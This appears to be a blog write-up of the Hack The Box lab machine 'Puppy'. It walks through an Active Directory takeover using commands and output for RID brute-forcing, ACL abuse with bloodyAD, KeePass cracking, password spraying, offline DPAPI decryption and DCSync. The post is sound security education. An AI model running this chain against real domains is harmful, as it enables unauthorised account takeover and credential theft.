---
title: "Puppy"
date: 2025-09-28 00:00:00 +0800
categories: [Walkthroughs]
description: "Seasonal Machine — Medium"
tags: [HTB]
---

![ad-module](/assets/img/favicons/puppy/puppy.png)

### Introduction
**Puppy** is a medium-difficulty Windows Active Directory machine taht demonstrates how a chain of small Active Directory weaknesses can escalate into a full domain takeover. Starting from a valid low-privilege credential, the attack leveraged overly permissive ACLs, credential recovery, and DPAPI decryption to escalate privileges, ultimately executing a DCSync attack to obtain domain administrator access. This path highlights the risks of weak backup and credential hygiene practices, showing how seemingly minor misconfigurations can converge into complete Active Directory compromise.

### Reconnaissance
AD services and WinRM discovered. Valid credential levi.james:KingofAkron2025! verified with NetExec; shares enumerated (smbmap) and BloodHound data collected (bloodhound-python).
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ nmap -Pn -p- --min-rate 2000 -sCV  10.10.11.70

Nmap scan report for 10.10.11.70
Host is up (0.018s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-20 00:43:30Z)
111/tcp   open  rpcbind       2-4 (RPC 100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
60653/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-20T00:44:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
Key findings:
LDAP/AD, Kerberos, SMB, WinRM (5985). Server identified as Windows Server 2022 domain controller.



### Initial Access and Enumeration

According to the machine description, we start with the following credentials:
- Username: **levi.james**
- Password: **KingofAkron2025!**

Let's validate them:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ netexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!'
SMB     10.10.11.70 445 DC      [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB     10.10.11.70 445 DC      [+] PUPPY.HTB\levi.james:KingofAkron2025!
```


Great! The credentials are valid. Now, let's use NetExec to brute-force user RIDs and extract valid domain accounts:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ netxec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --rid-brute
```
![ad-module](/assets/img/favicons/puppy/3.png)
As we can see we got 10 valid domain accounts.

Now to continue further, we need to add host information to resolve internal Domain names:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ netexec smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --generate-hosts-file "$(pwd)/hosts"
SMB     10.10.11.70 445 DC      [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB     10.10.11.70 445 DC      [+] PUPPY.HTB\levi.james:KingofAkron2025!
```
![ad-module](/assets/img/favicons/puppy/4.png)

Move it to `/etc/hosts`:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ cat hosts >> /etc/hosts
```

Let's spider accessible SMB shares:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ netxec smb puppy.htb -u levi.james -p 'KingofAkron2025!' -M spider_plus
```
![ad-module](/assets/img/favicons/puppy/5.png)
We noticed that there is a `DEV` share intended for `PUPPY-DEVS` group members but our current user doesn't have access to it.

```shell
DEV                    NO ACCESS       DEV-SHARE for PUPPY-DEVS
```

### BloodHound Enumeration

We visualize and map the Active Directory environment using BloodHound data collected via `rusthound-ce`, which collects and exports information like group memberships, sessions, local admins, ACLs, trusts :


![ad-module](/assets/img/favicons/puppy/7.png)


![ad-module](/assets/img/favicons/puppy/8.png)

Ingest data into BloodHound:

![ad-module](/assets/img/favicons/puppy/9.png)


After importing the data into BloodHound, we discovered that our user `levi.james` has **GenericWrite** permissions on the `DEVELOPERS` group.

![ad-module](/assets/img/favicons/puppy/10.png)

This is significant because it means we can add ourselves to this group.

### First Privilege Escalation: Joining DEVELOPERS Group

Using the BloodyAD tool, I can add levi.james to the DEVELOPERS group:
![ad-module](/assets/img/favicons/puppy/11.png)
DONE!

Now let's dive into the `DEV` share:
![ad-module](/assets/img/favicons/puppy/12.png)

Inside the DEV share, I find:

- KeePassXC-2.7.9-Win64.msi (a password manager installer)
- Projects/ (directory)
- recovery.kdbx (a KeePass database file)

The KeePass database looks interesting. Let's download it and use `keepassbrute` to break it for us:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ keepassbrute recovery.kdbx /usr/share/wordlists/rockyou.txt
```

After running the script we discovered the password:
```shell
[*] Password found: ******
```

Now with this simple python script we can export the content to a human readable output:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ python3 - <<'PY'
from pykeepass import PyKeePass
kp = PyKeePass('recovery.kdbx', password='******')
for entry in kp.entries:
    # skip entries without title if you want
    print(f"---Username: {entry.title}\nPassword: {entry.password}\nURL: {entry.url}\nNotes: {entry.notes}\n---")
PY
---
Username: JAMIE WILLIAMSON
Password: *********
URL: puppy.htb
Notes: None
---
Username: ADAM SILVER
Password: *********
URL: puppy.htb
Notes: None
---
Username: ANTONY C. EDWARDS
Password: *********
URL: puppy.htb
Notes: None
---
Username: STEVE TUCKER
Password: *********
URL: puppy.htb
Notes: None
---
Username: SAMUEL BLAKE
Password: *********
URL: puppy.htb
Notes: None
---
```

After saving these passwords into a file to spray them, we can use NetExec for this:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ netexec smb puppy.htb -u 'valid-users.txt' -p 'passwords.txt' --continue-on-success
```
Finally we got a hit with `ant.edwards` !
```shell
SMB    10.10.11.70    445    DC    [+] PUPPY.HTB\ant.edwards:*********
```

### Second Privilege Escalation: Targeting adam.silver

Let's get get BloodHound data with the new credentials.
After ingesting new data, let's look what does this user have:

![ad-module](/assets/img/favicons/puppy/13.png)

After analyzing the results, we discovered that `ant.edwards` has `GenericWrite` permissions on the `adam.silver` user account. This means we can modify this account, including enabling it becasuse it is disabled and resetting its password.

Change `adam.silver` passowrd using `NetExec`: 
![ad-module](/assets/img/favicons/puppy/14.png)

Enable `adam.silver` using `bloodyAD`:
![ad-module](/assets/img/favicons/puppy/15.png)

Validate the new credentials:
![ad-module](/assets/img/favicons/puppy/16.png)
Awesome! We can see that `adam.silver` hash privileges over **Winrm** 

### Accessing Winrm as adam.silver

First, let's retrieve the user flag using `NetExec`:
![ad-module](/assets/img/favicons/puppy/17.png)

While exploring the system, we discovered `Backups` folder:
![ad-module](/assets/img/favicons/puppy/18.png)

After downloading and extracting the ZIP file, we examined its contents and found an interesting backup configuration file: `nms-auth-config.xml.bak`
![ad-module](/assets/img/favicons/puppy/19.png)

![ad-module](/assets/img/favicons/puppy/20.png)
This file contains credentials:

- Username: `steph.cooper`
- Password: `**********`

### Third Privilege Escalation: Access as steph.cooper

Let's verify these credentials:

```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ netexec winrm puppy.htb -u 'steph.cooper' -p '***********'
WINRM    10.10.11.70     5985    DC      [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
WINRM    10.10.11.70     5985    DC      [+] PUPPY.HTB\steph.cooper:********** (Pwn3d!)
```
Great! Let's connect with Evil-WinRM:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ evil-winrm -i puppy.htb -u 'steph.cooper' -p '***********'
```

### DPAPI Credential Harvesting
After connecting as steph.cooper, I'll look for stored credentials. In Windows, credentials are often protected using DPAPI.

```shell
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> dir C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\
Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials

Mode    LastWriteTime    Length    Name
----    -------------    ------    ----
-a-hs-    3/8/2025 7:54 AM    414    C8D69EBE9A43E9DEBF6B5FBD48B521B9
```
We also need the DPAPI master key:

```shell
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> dir C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\
Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107

Mode    LastWriteTime    Length    Name
----    -------------    ------    ----
-a-hs-    3/8/2025 7:40 AM    740    556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-    2/23/2025 2:36 PM    24    Preferred
```

Now let's download these files for offline decryption:
```shell
download "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"
```

```shell
download "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407"
```

### Offline DPAPI Credential Decryption

Now that we have the necessary files, we'll decrypt them using Impacket's DPAPI tool:

```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ impacket-dpapi masterkey -file 'masterkey_blob' -password '***********' -sid 'S-1-5-21-1487982659-1829050783-2281216199-1107'
```
The decryption provides a master key:

- Decrypted key: `0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba9`

Now let's use this key to decrypt the credential blob:
```shell
┌───(root㉿kali)-[/home/kali/HTB/Puppy]
└─$ impacket-dpapi credential -file 'credential_blob' -key '0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84'
```

![ad-module](/assets/img/favicons/puppy/21.png)
Great! We've discovered another set of credentials:

- Username: `steph.cooper_adm`
- Password: `************`

### Final Privilege Escalation: DCSync Attack

Analysis of BloodHound reveals that `steph.cooper_adm` has `DCSync` privileges. With `DCSyn`c rights, we can extract password hashes for any domain user, including `Administrator`!
We can do that with the help of `NetExec`:
![ad-module](/assets/img/favicons/puppy/22.2.png)

### Obtaining the Root Flag
![ad-module](/assets/img/favicons/puppy/23.png)
